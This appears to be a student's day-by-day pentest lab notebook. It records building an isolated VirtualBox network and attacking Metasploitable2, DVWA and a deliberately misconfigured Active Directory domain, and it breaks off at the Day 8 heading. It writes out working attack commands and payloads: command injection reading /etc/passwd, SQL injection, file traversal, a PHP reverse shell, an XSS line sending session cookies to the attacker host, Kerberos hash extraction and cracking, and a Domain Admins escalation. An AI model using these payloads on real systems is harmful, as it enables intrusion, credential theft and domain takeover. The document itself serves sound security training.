# Lab notebook — day by day

Each day gets one entry. Copy the template at the bottom when starting a new day.

---

## Day 1 — 2026-11-18

### Goals
- Build the base segmented network and get pfSense routing between zones.

### What I did
- Created 3 VirtualBox internal networks (net-serveurs, net-users, net-attaquants) + NAT for the WAN.
- Installed pfSense CE 2.6.0, assigned the 4 interfaces (WAN, LAN, OPT1, OPT2).
- Assigned IPs: LAN 10.0.10.1, OPT1 10.0.20.1, OPT2 10.0.30.1.
- Configured static IPs on Kali (10.0.30.10) and Ubuntu (10.0.10.20), with a route from Kali to the servers zone via pfSense.
- Accessed the pfSense WebGUI from Ubuntu and completed the setup wizard.
- Created a Pass ICMP rule on ATTACKERS (source ATTACKERS net → destination 10.0.10.20) and verified it: ping to 10.0.10.20 succeeds (TTL=63, confirming it passed through pfSense), ping to 10.0.10.1 stays blocked.
- Added a Pass TCP port 80 rule and installed Apache on Ubuntu: watched Nmap's report on 10.0.10.20 move from `filtered` (no rule) to `closed` (rule but no service) to `open` (service running).
- Set a static IP on Metasploitable (10.0.10.30), took a clean snapshot, added a broad ATTACKERS → 10.0.10.30 rule, and ran `nmap -sV 10.0.10.30`: 23 open ports out of 1000 scanned, with service versions identified (vsftpd 2.3.4, OpenSSH 4.7p1, Samba, MySQL, PostgreSQL, etc.).

### Problems & fixes
- First IP assignment on pfSense's OPT interfaces was swapped (ATTACKERS and USERS zones reversed) — found by comparing VirtualBox adapter order with pfSense's MAC addresses.
- Ubuntu's `netplan-enp0s3` connection silently ignored `nmcli modify ... manual` — fixed by creating a fresh nmcli connection instead of editing the netplan-generated one.

### What I learned
- A firewall rule only controls whether a packet reaches a host — whether a port is actually open still depends on a service listening there.
- `filtered` / `closed` / `open` each mean something different: no response, response but no service, response with a service.
- Promiscuous mode only matters for sniffing traffic on a virtual network segment; it has no effect on basic routing or static IP configuration.

### Next
- Triage Metasploitable's exposed services and start documenting them for the report.

---

## Day 2 — 2026-11-19

### Goals
- Triage Metasploitable's exposed services and start credential/vulnerability research.
- Fix a networking issue on Kali (lost internet access).

### What I did
- Picked 3 services from the Nmap scan to investigate: MySQL 5.0.51a (3306), PostgreSQL 8.3.0-8.3.7 (5432), ProFTPD 1.3.1 (2121).
- Used `searchsploit` on each, then learned to cross-check the exact affected version against each result instead of trusting the title alone — several results didn't actually apply to the installed version.
- Confirmed a real match for MySQL (DoS, versions prior to 5.1.49) via a public advisory.
- Identified PostgreSQL's UDF command execution path as the most interesting lead, but noted it requires authenticated DB access first — not a pre-auth exploit.
- Used Metasploit's `auxiliary/scanner/postgres/postgres_login` module to test for default/weak credentials on PostgreSQL: found a valid account and got an interactive session.
- Learned the session's command syntax (`query <SQL>` instead of raw SQL), and reviewed the list of follow-up modules available from that session (hashdump, schemadump, version, etc.).
- Lost internet access on Kali; diagnosed it as eth0 (NAT) being disconnected while eth1 (lab network) still worked. Renamed the attackers' internal network from `net-attaquants` to `net-attackers` (updated identically in pfSense).
- Learned how Linux picks which interface to use per destination: longest-prefix-match routing, with `ipv4.never-default` on eth1 preventing it from competing with eth0 for the default route.
- Hit transient duplicate/corrupted ping replies after repeatedly toggling the virtual cable — resolved by reconnecting properly and flushing the ARP cache; confirmed real traffic (HTTP to Metasploitable) was unaffected.

### Problems & fixes
- `searchsploit <product>` without a version returns every version's exploits — must filter manually or re-run with the exact version string.
- Kali's eth0 showed as `disconnected` because the virtual cable was unplugged in VirtualBox from an earlier test; reconnecting it and/or recreating the nmcli profile fixed it.
- Flapping the virtual cable a few times left stale ARP entries, producing corrupted/duplicate ping replies — not an actual network fault.

### What I learned
- An exploit title's version range (`< X`) only means the bug was *introduced* at some point before X and fixed in X — it doesn't mean every older version is affected. Always check the advisory text.
- Credential enumeration (testing default/weak logins) is a standard, necessary step before any further access — not something to skip by just looking up documented defaults.
- A multi-homed Linux box (two NICs) uses the most specific matching route for each destination; the "default route" only handles traffic with no more specific match.

### Next
- Decide whether to pursue the PostgreSQL privilege-escalation path further or move to Blue Team work (Wazuh) with what's already found.
- Keep consolidating findings (service, version, port, credentials found, method used) toward the final report.

---

## Day 3 — 2026-11-20

### Goals
- Obtain an initial foothold on Metasploitable2 by targeting an unexploited network daemon (UnrealIRCd).
- Assess web applications hosted on Metasploitable2 (Apache 2.2.8 / PHP 5.2.4), focusing on DVWA (Damn Vulnerable Web Application).
- Conduct web directory reconnaissance and user enumeration.
- Evaluate authentication brute-forcing tools (Burp Suite Intruder vs. THC-Hydra vs. Wfuzz).
- Test OS Command Injection across different security levels (Low, Medium, High).
- Conclude the Red Team exploitation phase and prepare for Blue Team detection.

### What I did
- **IRC Exploitation (UnrealIRCd)**:
  - Having already exploited PostgreSQL via UDF on Day 2, and having previously practiced exploiting services like MySQL and ProFTPD in prior lab contexts, I chose to skip redundant testing on those and focus my efforts on unfamiliar territory.
  - Fingerprinted the IRC service on port 6667 via `irssi`, confirming `Unreal3.2.8.1. irc.Metasploitable.LAN`.
  - Exploited UnrealIRCd 3.2.8.1 using Metasploit's `exploit/unix/irc/unreal_ircd_3281_backdoor` module — [CVE-2010-2075](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2010-2075).
  - Obtained an interactive Meterpreter session; command `getuid` confirmed the session executes with `root` privileges.
- **Web Directory Indexing & User Enumeration**:
  - Navigated to `http://10.0.10.30/dvwa/hackable/` and discovered directory browsing was enabled on Apache.
  - Enumerated `/dvwa/hackable/users/`, which exposed avatar image filenames revealing 5 valid application usernames: `1337`, `admin`, `gordonb`, `pablo`, and `smithy`.
- **Authentication Brute-Forcing**:
  - Intercepted the DVWA login POST request (`/dvwa/login.php`) via Burp Suite and configured Intruder using a targeted dictionary.
  - Utilized `Grep - Match` against the failure string `"Username and/or password incorrect."` to detect login anomalies; successfully identified the valid administrative credential `admin:password` (reflected by unchecked error match and distinct response length 4985 vs. 4923 bytes).
  - Attempted command-line brute-forcing using **THC-Hydra** (`hydra -l admin -P ... http-post-form`), but found it to be an **unoptimal solution** due to rigid POST-form delimiter syntax, complex cookie handling, and false positive matches (flagging 16 false matches within 2 seconds due to an incorrect failure match string and unauthenticated session redirection).
  - Switched to **Wfuzz** as an optimal alternative: configured the session cookie (`PHPSESSID` and `security=low`) with the `darkweb2017_top-1000.txt` wordlist (`wfuzz -c -z file,... -d "username=admin&password=FUZZ&Login=Login" -b "PHPSESSID=...; security=low" http://10.0.10.30/dvwa/vulnerabilities/brute/`).
  - Wfuzz successfully isolated `password` (ID 4, length 4637 characters, distinct word/line count) from incorrect attempts before hitting the server's 90-second socket timeout.
- **OS Command Injection (DVWA Ping utility `/dvwa/vulnerabilities/exec/`)**:
  - **Security = Low**: Input validation was completely absent (`shell_exec("ping -c 3 " . $target)`). Injected **Payload 1**: `10.0.10.30 && cat /etc/passwd`, which appended the command after the ping and dumped the entire `/etc/passwd` file.
  - **Security = Medium**: The application introduced a blacklist attempting to strip `;` and `&&` (`str_replace(array("&", ";"), "", $target)`). Injected **Payload 2**: `10.0.10.30 | cat /etc/passwd`, bypassing the filter via the pipe (`|`) operator and executing arbitrary commands.
  - **Security = High**: Inspected the PHP source code to assess exploitability. Identified strict input validation: the code splits the IP address by `.` (`explode(".", $target)`), verifies that exactly 4 octets exist (`sizeof($octet) == 4`), and validates that every octet is strictly numeric (`is_numeric($octet[0])` through `is_numeric($octet[3])`). Because no shell metacharacters or alphanumeric command strings can satisfy this condition, **Security = High is impossible to break**.

### Problems & fixes
- **Hydra Syntax & False Positives**: Hydra failed initially with invalid parameter count, and then generated 16 false positives because the error string pattern and cookie state were desynchronized with DVWA's session flow. Fixed by transitioning to Wfuzz, which provided cleaner HTTP header injection and accurate response filtering.
- **Wfuzz Pycurl Timeout**: Long-running brute-force requests hit a 90-second server timeout due to Apache keep-alive exhaustion on Metasploitable2. Mitigated by filtering directly on response word/character counts and using targeted password lists.
- **Medium Security Blacklist Filter**: DVWA Medium sanitized `&&` and `;`, breaking standard command chaining. Fixed by switching to the pipe operator (`|`), demonstrating the fundamental weakness of naive blacklist sanitization.

### What I learned
- CVE-2010-2075 is a supply-chain backdoor: the official UnrealIRCd 3.2.8.1 source archive was tampered with at the distribution server, so the backdoor is present regardless of how the service is configured — not a logic flaw in the protocol itself.
- Landing directly as `root` reflects how permissively the service was run on Metasploitable, which is realistic for this intentionally vulnerable target but not for a hardened production system.
- Directory indexing is an overlooked high-impact information disclosure flaw that provides attackers with targeted usernames for offline or online brute-force attacks.
- Blacklisting specific characters (`&&`, `;`) in input validation is fragile and ineffective because alternative shell operators (`|`, `||`, newline, backticks) can achieve the same command chaining.
- Whitelisting and type checking (as implemented in DVWA High with `explode()` and `is_numeric()`) provide genuine security by ensuring inputs conform strictly to expected data types, making command injection impossible.
- Tool selection matters: while Burp Intruder excels in interactive GUI analysis and Wfuzz offers robust and flexible header/cookie CLI fuzzing, Hydra can be prone to false positives when web application sessions require dynamic cookie management.

### Next
- Continue assessing remaining DVWA attack surfaces (CSRF, File Inclusion, SQL Injection, File Upload, and XSS).
- Prepare to deploy Windows Server to expand the home lab with Active Directory.

---

## Day 4 — 2026-11-21

### Goals
- Perform deep-dive vulnerability assessments on DVWA covering Cross-Site Request Forgery (CSRF), Local File Inclusion (LFI), SQL Injection (manual & automated), and Arbitrary File Upload to achieve Remote Code Execution (RCE).

### What I did
- **Cross-Site Request Forgery (CSRF)**:
  - Investigated the password change module (`/dvwa/vulnerabilities/csrf/`).
  - **Security = Low**: The form transmits password changes via GET requests (`?password_new=test123&password_conf=test123&Change=Change`) with zero CSRF tokens or re-authentication checks, allowing trivial one-click account takeover.
  - **Security = Medium**: Inspected requests in Burp Suite; observed that the backend checks the HTTP `Referer` header (`Referer: http://10.0.10.30/dvwa/vulnerabilities/csrf/`). While it blocks external requests without a matching referer, it remains susceptible if the attacker can spoof or omit the header.
  - **Security = High**: Confirmed the implementation introduces a mandatory `Current password` (`password_current`) verification field, effectively mitigating unauthenticated CSRF password resetting.
- **Local File Inclusion (LFI)**:
  - Targeted the page inclusion parameter (`/dvwa/vulnerabilities/fi/?page=...`).
  - Successfully performed directory traversal using payload `../../../../etc/passwd`, causing the PHP runtime to traverse out of the web root and render the server's cleartext `/etc/passwd` file directly in the browser.
- **SQL Injection (Manual Exploitation)**:
  - **Security = Low**: Parameter `$id` is concatenated directly into single quotes: `WHERE user_id = '$id'`. Injected `1' or '1' = '1`, breaking string bounds and forcing a tautology that dumped all 5 database user accounts (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith).
  - **Security = Medium**: Analyzed the PHP source code; found input is sanitized with `mysql_real_escape_string($id)`, but the SQL query is constructed as `WHERE user_id = $id` (numeric context, unquoted). Because numeric injection does not require single quotes, injected payload `0 OR 1=1`, which completely bypassed escaping and extracted all records.
  - **Security = High**: Source code inspection confirmed strict input validation using `stripslashes()`, `mysql_real_escape_string()`, and `if (is_numeric($id))`, completely blocking injection.
- **SQL Injection (Automated Exploitation with `sqlmap`)**:
  - Ran `sqlmap -u "http://10.0.10.30/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=...; security=low" --batch --dbs`.
  - Confirmed 4 distinct SQL injection vectors: boolean-based blind, error-based, time-based blind, and UNION query.
  - Successfully extracted the DBMS banner (MySQL >= 4.1 / Ubuntu Linux) and enumerated all 7 hosted databases: `dvwa`, `information_schema`, `metasploit`, `mysql`, `owasp10`, `tikiwiki`, `tikiwiki195`.
- **Arbitrary File Upload to Remote Code Execution (RCE)**:
  - Exploited unrestricted file upload at `/dvwa/vulnerabilities/upload/` by uploading a PHP reverse shell script (`shell.php`).
  - The application confirmed upload to `../../hackable/uploads/shell.php`. Verified storage and execute permissions by browsing to the exposed `/dvwa/hackable/uploads/` directory listing.
  - Started a Netcat listener on Kali (`nc -lvnp 1234`) and triggered the webshell via HTTP request. Successfully received a reverse shell session running under the web server service account `www-data` (`uid=33(www-data) gid=33(www-data)`).

### Problems & fixes
- **Medium Security SQL Injection Quoting Trap**: Initially expected `mysql_real_escape_string()` to sanitize SQL input, but realized escaping only neutralizes quotes. Because the query omitted quotes around the integer column (`WHERE user_id = $id`), an unquoted numeric payload (`0 OR 1=1`) bypassed sanitization effortlessly.
- **Path Traversal Depth**: Needed to verify relative directory depth from `/var/www/dvwa/vulnerabilities/fi/` back to filesystem root; 4 traversal hops (`../../../../`) reliably reached `/etc/passwd`.

### What I learned
- Input sanitization functions like `mysql_real_escape_string()` are context-dependent; without parameterized queries (prepared statements), queries with unquoted numeric fields remain trivially vulnerable to SQL injection.
- Unrestricted file upload combined with direct web-accessible storage and execution privileges provides an immediate bridge from web application access to interactive operating system code execution.
- Defense-in-depth for state-changing operations requires both anti-CSRF tokens and re-authentication (current password verification).

### Next
- Assess remaining web vulnerabilities: Reflected and Stored Cross-Site Scripting (XSS).
- Demonstrate session hijacking via XSS cookie exfiltration.
- Begin deployment of the Windows Server VM to start building the Active Directory domain.

---

## Day 5 — 2026-11-22

### Goals
- Conclude web application assessments by exploiting Reflected and Stored Cross-Site Scripting (XSS), including session cookie theft.
- Begin infrastructure expansion by creating and installing a Windows Server virtual machine (`WindowsSRV`) in VirtualBox for the upcoming Active Directory lab.

### What I did
- **Reflected Cross-Site Scripting (XSS)**:
  - **Security = Low**: The `name` parameter is printed directly to the page without escaping (`echo 'Hello ' . $_GET['name']`). Injected `<script> alert("hacked")</script>`, triggering a JavaScript alert popup (`10.0.10.30 says: hacked`).
  - **Session Hijacking Proof of Concept**: Set up a Netcat listener on Kali (`nc -lvnp 1234`). Crafted an XSS payload directing the browser to send document cookies to Kali:
    `<script>new Image().src="http://10.0.30.10:1234/?cookie="+encodeURIComponent(document.cookie);</script>`
    The victim browser triggered the request, and Netcat captured the cleartext session cookies: `security=low; PHPSESSID=f51c426407f029bb0b88ba566dbb8971`.
  - **Security = Medium**: Source code review revealed a naive blacklist filter: `str_replace('<script>', '', $_GET['name'])`. Bypassed the case-sensitive string replacement using uppercase tags `<SCRIPT> alert("hacked")</SCRIPT>`, executing the payload successfully.
  - **Security = High**: Verified that the developer implemented `htmlspecialchars($_GET['name'])`, which properly encodes HTML characters (`<`, `>`, `&`, `"`) into entities and completely stops XSS execution.
- **Stored Cross-Site Scripting (XSS)**:
  - **Security = Low**: Injected `<script> alert("hacked") </script>` into the guestbook Message field. The script was stored persistently in the database and executed automatically whenever the guestbook page was visited.
  - **Security = Medium**: Inspected PHP source code; found the developer sanitized the Message parameter (`mtxMessage`) thoroughly with `strip_tags()`, `addslashes()`, and `htmlspecialchars()`, BUT only applied a naive case-sensitive filter `str_replace('<script>', '', $name)` to the Name field (`txtName`).
  - Bypassed the defense by injecting `<SCRIPT> alert("hacked") </SCRIPT>` into the **Name** input, successfully achieving persistent Stored XSS.
- **Active Directory Lab Expansion — Windows Server Deployment (`WindowsSRV`)**:
  - Configured a new VirtualBox VM `WindowsSRV` to establish the upcoming Windows Server & Active Directory domain controller.
  - Attached the Windows Server installer ISO and booted the VM ("Getting ready").
  - Encountered an initial boot issue: the VM booted into a Server Core command prompt (`C:\Users\SRV>cmd.exe`) and subsequently black-screened with a frozen `C:\Windows\system32\LogonUI.exe` prompt.
  - Initiated a clean reinstall ("Windows Setup - Getting files ready for installation").
  - On restart, hit a bootloader error: `"An operating system wasn't found. Try disconnecting any drives that don't contain an operating system. Press Ctrl+Alt+Del to restart"`.

### Problems & fixes
- **Case-Sensitive XSS Filter Flaw**: DVWA Medium attempted to sanitize `<script>` with `str_replace()`, ignoring that HTML parsers are case-insensitive. Bypassed effortlessly with uppercase `<SCRIPT>`.
- **Inconsistent Parameter Sanitization**: In Stored XSS Medium, the developer heavily sanitized the main comment body but left the author name field weakly protected, illustrating the risk of partial/inconsistent sanitization.
- **Windows Server Boot Error ("An operating system wasn't found")**: Caused by VirtualBox storage controller boot order prioritizing an unbootable secondary disk or optical drive detachment issues following Windows installation reboot. Resolved by reconfiguring the VM boot order to prioritize the primary VDI virtual disk and verifying SATA controller settings.

### What I learned
- Cross-Site Scripting becomes a critical vulnerability when combined with session cookie exfiltration; without the `HttpOnly` cookie flag, an attacker can steal session identifiers and achieve full session hijacking.
- Blacklist-based filtering (`str_replace`) is inherently fragile and should never be used for security-critical sanitization; context-aware output encoding with `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')` is the only reliable defense against XSS.
- Deploying multi-platform home lab infrastructure requires troubleshooting hypervisor-level storage attachments, BIOS/EFI boot modes, and boot order configurations alongside security engineering tasks.

### Next
- Resolve Windows Server boot configuration and finalize the Active Directory domain controller setup.
- Consolidate all new DVWA findings (CSRF, LFI, SQLi, File Upload RCE, Reflected/Stored XSS) into `reports/pentest-report.md`.
- Begin Blue Team detection engineering: deploy Wazuh SIEM agents to capture both Linux and Windows events.

## Day 6 — 2026-11-23 / 2026-11-24

### Goals
- Install Windows Server 2019 and promote it to a Domain Controller (new AD lab component)
- Understand Active Directory / Kerberos fundamentals (DC role, SPN, Kerberos ticket flow)
- Deliberately misconfigure the AD environment with three classic vulnerabilities:
  1. Kerberoastable service account (SPN set on a user account)
  2. AS-REP Roastable account (Kerberos pre-authentication disabled)
  3. Misconfigured ACL (GenericAll granted on a sensitive group)
- Exploit each misconfiguration from Kali to confirm they are real attack paths, not just theory

### What I did

**Windows Server 2019 install & AD DS promotion**
- Installed Windows Server 2019 (Desktop Experience edition) in VirtualBox, attached to the SERVERS network (10.0.10.0/24)
- Promoted the server to a Domain Controller, creating a new forest/domain: `label.local`
  - Hostname: `DC01`
  - IP: `10.0.10.40/24`
  - DSRM password set during promotion
  - Confirmed via Server Manager: AD DS + DNS roles active, no pending alerts
- Created an Organizational Unit `LAB` under the domain to hold lab accounts (`compte1`, `compte2`, and the three vulnerable accounts below)

**Mission 1 — Kerberoasting setup**
- Created a service account `svc-sql`
- Assigned it a Service Principal Name (SPN) to simulate a real service account:
  ```
  setspn -A MSSQLSvc/dc01.label.local:1443 svc-sql
  ```
- Verified with `setspn -L svc-sql`
- Concept: any authenticated domain user can request a Kerberos service ticket for any account that has an SPN. Part of that ticket is encrypted with the service account's password hash, so it can be extracted and cracked offline without ever touching the account directly — no special privilege required to request the ticket.
- Reset `compte1`'s password via ADUC (forgotten), unchecked "must change password at next logon" to avoid the same block hit with `acl-test`
- From Kali, authenticated as `compte1` (a plain standard account, no special rights) and requested the TGS:
  ```
  impacket-GetUserSPNs label.local/compte1:<password> -dc-ip 10.0.10.40 -request
  ```
- Got the TGS hash immediately (`$krb5tgs$23$*svc-sql$LABEL.LOCAL$...`). Tool output also showed `PasswordLastSet: <never>` / `LastLogon: <never>` for `svc-sql` — a real giveaway of an unused, never-rotated service account.
- Cracked with hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23):
  ```
  hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
  ```
  Password recovered instantly: `Password1`

**Mission 2 — AS-REP Roasting**
- Created account `asrep-test`, checked "Do not require Kerberos preauthentication" in ADUC (Account tab)
- Hit a tooling snag: PowerShell (`Get-ADUser -Properties DoesNotRequirePreAuth` / raw `userAccountControl`) returned completely blank values with no error, even via direct ADSI queries (`[adsi]"LDAP://..."` threw "directory property cannot be found in the cache"). Root cause turned out to be the ADWS (Active Directory Web Services) service needing a restart after the fresh promotion — once restarted (`Restart-Service ADWS` as Administrator), `Get-ADUser` correctly reported `DoesNotRequirePreAuth : True` and `Enabled : True`.
- Opened pfSense firewall: added a rule on OPT2 (ATTACKERS interface, em3) allowing TCP/UDP port 88 (Kerberos) from ATTACKERS net to 10.0.10.40
- From Kali, installed Impacket (`impacket-scripts` via apt) and ran:
  ```
  impacket-GetNPUsers label.local/asrep-test -no-pass -dc-ip 10.0.10.40
  ```
- First attempt hung indefinitely. Diagnosed with `tcpdump -i eth1 port 88 -n`: TCP handshake completed and the AS-REQ packet was ACKed by the DC, but no Kerberos response ever came back — pointed to the KDC (Key Distribution Center) service itself, not the network. Checked `Get-Service kdc` on the DC (it was running) and retried — it worked.
- Obtained the AS-REP hash (`$krb5asrep$23$asrep-test@LABEL.LOCAL:...`), where `23` = etype RC4-HMAC (derived from the NTLM hash, fast to crack)
- Cracked offline with hashcat:
  ```
  hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
  ```
  Result: password recovered in ~1 second — `Welcome1` (rockyou.txt dictionary hit)

**Mission 3 — ACL misconfiguration (GenericAll on Domain Admins)**
- Created a standard low-privilege account `acl-test`
- In ADUC (Advanced Features enabled), opened `Domain Admins` group → Properties → Security → Advanced, and granted `acl-test` **Full Control** (`GenericAll`) on the group object itself
- Opened pfSense: added TCP/UDP port 389 (LDAP) from ATTACKERS to 10.0.10.40
- Installed `bloodyAD` on Kali (`pipx install bloodyAD`)
- First exploitation attempts failed:
  - `SEC_E_CONTEXT_EXPIRED` — caused by ~6 hour clock skew between Kali and the DC (Kerberos requires clocks within 5 minutes). Fixed by syncing both clocks manually, and disabling VirtualBox's automatic guest/host time sync for the DC VM (`VBoxManage setextradata "<VM>" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1`), since Guest Additions kept overwriting manual time corrections.
  - `SEC_E_LOGON_DENIED` — caused by the "User must change password at next logon" flag being set on `acl-test`, blocking authentication. Unchecked it and the login succeeded.
- Ran the actual exploit:
  ```
  bloodyAD --host 10.0.10.40 -d label.local -u acl-test -p 'Password1' add groupMember "Domain Admins" acl-test
  ```
  Output: `[+] acl-test added to Domain Admins`
- Confirmed on the DC with `Get-ADGroupMember "Domain Admins"` — `acl-test` now listed as a member

### Problems & fixes
- PowerShell / ADSI returning blank `userAccountControl` for a valid account → fixed by restarting the ADWS service on the DC (cache/service state issue after fresh promotion, not a real data problem)
- Windows Server VM severe lag / input freeze (Hyper-V → NEM fallback) → deprioritized, not fully confirmed resolved; Guest Additions install was the last attempted fix
- `GetNPUsers.py` hanging with no response → diagnosed via `tcpdump` that TCP was fine but the KDC never replied at the Kerberos layer; resolved after a general service check / retry
- pfSense default-deny blocked AS-REP Roasting and ACL exploitation until explicit rules were added for TCP/UDP 88 (Kerberos) and TCP/UDP 389 (LDAP) from ATTACKERS → 10.0.10.40
- ~6 hour clock skew between Kali and DC broke Kerberos authentication (`SEC_E_CONTEXT_EXPIRED`); VirtualBox's automatic host-time sync was overwriting manual corrections on the DC, had to be disabled via `VBoxManage` from the host
- "User must change password at next logon" flag silently caused `SEC_E_LOGON_DENIED` on `acl-test` until unchecked

### What I learned
- Kerberoasting and AS-REP Roasting both allow extracting a crackable password hash *before* having any valid credentials — the attack surface exists purely because of how SPNs and pre-authentication work, not because of a traditional software vulnerability.
- `etype 23` (RC4-HMAC) tickets are dramatically weaker to crack than AES-based tickets (`etype 17/18`) because RC4 keys derive directly from the NTLM hash — a real mitigation is enforcing AES-only Kerberos encryption on sensitive accounts, independent of password strength.
- AD permissions (ACEs/ACLs) are granted per-object and are narrow by default — `GenericAll` on one object only controls that object. The danger comes from *which* object is mis-permissioned: granting broad control over an object whose attributes define domain-wide privilege (like a privileged group's `member` list) turns a narrow permission into full domain compromise. This is privilege escalation by transitivity, not a direct admin grant.
- pfSense's "rule applies to the ingress interface" model keeps biting as new services get added — each new AD-related protocol (Kerberos/88, LDAP/389, and eventually SMB/445, RPC/135 for later work) needs its own explicit rule on the ATTACKERS (OPT2) interface before it's reachable, even though the DC itself has no local firewall blocking it.
- Clock sync matters as much as network/firewall reachability for Kerberos-based attacks — a connectivity test (`nmap`) can succeed while the actual protocol still fails entirely due to time skew.

### Next
- Set up a Windows 10/11 client VM in the USERS zone, joined to `label.local`
- Install BloodHound on Kali to map AD attack paths visually once a client is domain-joined
- Eventually: Blue Team phase (Wazuh SIEM) to detect these same attacks


---

## Day 7 — 2026-11-24: Windows 10 Client Domain Join & BloodHound Attack Path Visualization

### Goals
- Add a Windows 10 client to the lab, domain-joined to `label.local`, to simulate a realistic compromised workstation scenario
- Install BloodHound to visually map the AD attack paths created on Day 4
- Verify the Kerberoasting / AS-REP Roasting / ACL abuse findings are visible as actual graph relationships, not just manual CLI output

### What I did

**Windows 10 Pro client — domain join**
- Downloaded Windows 10 Pro (22H2, build 19045) — chosen over Windows 11 to avoid TPM 2.0/Secure Boot friction in VirtualBox and to keep resource usage lower
- Created the VM in VirtualBox, attached to the **USERS** network (`net-users`, zone OPT1/em2), **not** SERVERS
- Hit the VirtualBox 7 "Unattended Installation" feature by default generating a broken `autounattend.xml` with an empty product key (`Windows cannot read the <ProductKey> setting`). Fixed by unchecking **"Proceed with Unattended Installation"** in the New VM wizard and installing manually
- Installed Windows 10 **Pro** (required edition — Home cannot join an AD domain), selected "I don't have a product key", "Custom: Install Windows only"
- Configured the client's network manually (static IP, since pfSense has DHCP disabled lab-wide):
  - IP: `10.0.20.10/24`
  - Gateway: `10.0.20.1` (pfSense USERS interface)
  - DNS: `10.0.10.40` (the DC — required, since domain join depends on resolving `label.local` via the DC's own DNS)
- Added a pfSense rule on **OPT1 (USERS, em2)**: Source = USERS net, Destination = 10.0.10.40, Protocol = any — unlike the ATTACKERS rules, this is legitimate domain functionality, not a deliberately exposed target, so no port restriction was applied
- Joined the domain via System Properties → Computer Name/Domain Changes → Domain: `label.local`, authenticated with `compte1` (confirms that, by default, a standard domain user can join up to 10 computers without needing admin rights)
- Got "Welcome to the label.local domain", rebooted, logged in successfully as `label.local\compte1` from the client

**BloodHound setup on Kali**
- Needed a new pfSense rule on OPT2 (ATTACKERS, em3): TCP/UDP port **53** (DNS) to 10.0.10.40 — `bloodhound-python` needs to resolve `dc01.label.local` via the DC's DNS
- Kali ships **BloodHound Community Edition** by default now (not the old Neo4j+Electron version) — `bloodhound` command is deprecated in favor of `bloodhound-start`
- Hit a PostgreSQL version mismatch: `bloodhound-start` failed because a leftover PostgreSQL 17 cluster had its binaries removed (package `postgresql-17` no longer exists in the Kali repos; installing the generic `postgresql` meta-package pulled in v18 and tried, and failed, to auto-migrate the old cluster)
  - Fixed by dropping the dead cluster (`sudo pg_dropcluster 17 main --stop`) and creating a fresh one for the installed version (`sudo pg_createcluster 18 main --start`)
- `bloodhound-start` then succeeded, bringing up PostgreSQL + Neo4j + the BloodHound CE web UI on `http://127.0.0.1:8080`
- Logged into BloodHound CE with the default `admin:admin` credentials
- Set a new Neo4j password: `neo4j1`

**Data collection and analysis**
- Ran the collector from Kali (no footprint needed on the Windows client, authenticated as `compte1`, the same standard account used earlier for Kerberoasting):
  ```
  bloodhound-python -u compte1 -p '<password>' -d label.local -ns 10.0.10.40 -c DCOnly
  ```
  - `-c DCOnly` collects purely via LDAP against the DC (no SMB/RPC session enumeration needed on every host — kept consistent with the minimal firewall rules already in place)
  - `-ns 10.0.10.40` explicitly tells the tool which DNS server to query, since Kali's own resolver isn't configured for `label.local`
  - Kerberos authentication failed silently (`Name or service not known` — reverse DNS related) and the tool fell back to NTLM automatically; collection still succeeded: 10 users, 52 groups, 2 GPOs, 2 OUs, 19 containers, 2 computers
- Uploaded the generated JSON files into BloodHound CE's web UI (drag-and-drop uploader)
- Marked `acl-test` as "Owned" and ran a shortest-paths analysis
- **Result**: the graph showed a direct `MemberOf` edge from `ACL-TEST@LABEL.LOCAL` straight to `DOMAIN ADMINS@LABEL.LOCAL` — visual, immediate confirmation of the privilege escalation already carried out manually on Day 4

### Problems & fixes
- VirtualBox's "Proceed with Unattended Installation" (checked by default in VirtualBox 7's New VM wizard) generated a broken answer file → unchecked it and installed manually
- `bloodhound` command deprecated on current Kali → use `bloodhound-start` instead
- `postgresql-17` package no longer available in Kali's repos, leftover broken cluster blocked BloodHound's DB setup → dropped the dead cluster, created a new one matching the actually-installed PostgreSQL version (18)
- Needed two more explicit pfSense rules beyond the AD ones from Day 4: USERS→10.0.10.40 (any protocol, for the domain join itself) and ATTACKERS→10.0.10.40:53 (DNS, for BloodHound's collector to resolve the DC's hostname)

### What I learned
- A domain join needs working DNS resolution against the domain's own DNS server (the DC) — pointing the client at a public DNS would never work, since `label.local` isn't a real public domain
- By default, Windows lets any standard domain user join up to 10 machines to the domain (`ms-DS-MachineAccountQuota`) — no admin privilege required; this is itself a commonly abused default in real-world AD environments
- BloodHound's attack-path graph reflects the **current real state** of the directory (as collected via LDAP), not hypothetical "could happen" scenarios. An edge like `GenericAll` from a user straight to a privileged group is treated by BloodHound's analysis engine as functionally equivalent to a `MemberOf` edge, because it is just as exploitable — this is exactly how tools like this let defenders (or attackers) spot dangerous paths *before* they're actually abused, not just after
- `DCOnly` collection (pure LDAP against the DC) is enough to map users, groups, GPOs, OUs and ACLs — full SMB/RPC-based session collection would be needed only to discover *where users are currently logged in*, which wasn't needed for this exercise

### Next
- Document the remaining Kerberoasting SPN / AS-REP finding paths in BloodHound too (not just the ACL one) for completeness
- Eventually: Blue Team phase (Wazuh SIEM) to detect these same attack paths being exploited


---

## Day 8 — 2026-11-25: BloodHound `-c All`, LSASS Credential Dumping, Pass-the-Hash & DCSync Domain Takeover

### Goals
- Enable full BloodHound collection (`-c All`) to detect active user sessions, not just LDAP directory structure.
- Simulate a realistic lateral movement scenario: a Domain Admin (`acl-test`) signs into the Windows 10 workstation (`10.0.20.10`), and an attacker with local admin access extracts their credentials from memory.
- Confirm the full end-to-end domain compromise chain via Pass-the-Hash against `DC01` and audit any cross-tier password reuse.
- Extend the Pass-the-Hash compromise into a full DCSync attack, extracting the `Administrator` (RID 500) NTLM hash directly from the Domain Controller's replication mechanism.
- Validate the complete kill chain: local workstation compromise → LSASS dump → PtH session injection (`sekurlsa::pth`) → DCSync replication → PtH as built-in Administrator → `NT AUTHORITY\SYSTEM` on DC01.

### What I did

**Unblocking BloodHound `-c All` Collection (SMB/RPC Ports 135 & 445)**
